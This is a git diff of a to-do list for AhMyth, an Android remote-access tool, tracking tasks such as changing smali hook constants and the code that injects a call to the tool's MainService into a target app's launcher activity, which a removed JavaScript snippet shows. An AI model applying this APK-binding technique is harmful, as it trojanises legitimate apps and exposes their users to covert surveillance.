@@ -6,15 +6,13 @@
 #
 - [ ] 02: Merge Client & Server upgrades from [@HiddenPirates](https://github.com/HiddenPirates) and then integrate the Java code responisble for allowing the new hook function to work
 #
-- [ ] 03: Replace the exported `orgAppKey` variable in the `Constants.js` file, with the new hook point variable...
+- [x] 03: Replace the exported `orgAppKey` variable in the `Constants.js` file, with the new hook point variable...
 ```js
-exports.hookPoint = '\n\n' + 
-'return-void";
+exports.hookPoint = 'return-void';
 ```
 ...then replace the exported `serviceSrc` variable in the `Constants.js` file, with the new static hook metbod...
 ```js
-exports.serviceSrc = '\n\n' +
-'invoke-static {}, L';
+exports.serviceSrc = 'invoke-static {}, Lahmyth/mine/king/ahmyth/MainService';
 ```
 ...then replace the exported `serviceStart` variable in the `Constants.js` file....
 ```js
@@ -22,26 +20,9 @@ exports.serviceStart = ';->start()V' +
 '\n\n' +
 'return-void';
 ```
-....then replace the the old `onCreate` hook point code, with the new code for the new static hook function.
-```js
-var regex = /\/(\S+)\./;
-var str = launcherPath;
-var m = str.match(regex);
+....then replace the the old `onCreate` hook point code, with the new code for the new static hook function in **AppCtrl.js**
 
-var startService = serviceSrc + m[1] + serviceStart;
-
-var key = CONSTANTS.hookPoint;
-$appCtrl.Log("Modifiying Launcher Activity...");
-$appCtrl.Log();
-
-var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
-fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
-    if (error) {
-        $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
-        $appCtrl.Log();
-        return;
-    }
-```
+- Done!
 #
 - [x] 04: Figure out how to allow AhMyth to search `smali_classes` directories, 
 if the launcher activity is not present anywhere in the `smali` directory.
@@ -58,7 +39,3 @@ if the launcher activity is not present anywhere in the `smali` directory.
 - [ ] 06: Fix the binaries for 1.0-Beta.4 Release!
 #
 - [ ] 07: Implement the `REQUEST_IGNORE_BATTERY_OPTIMISATION` manifest permission in such a way where it wont be replaced when using the `Custom Permissions` feature.
-#
-- [ ] 08: Update the autoinstall script to install AhMyth based on the current supported OS's if they're detected after running the script, the script should also check to see if the required dependencies are installed, and install them if they're aren't.
-#
-- [ ] 09: Move the JavaScript code for the `Custom Permissions` feature to a seperate file in such a way that its able to be properly exported and used by the `AppCtrl.js` file when any of this feature's checkboxes return true/checked.
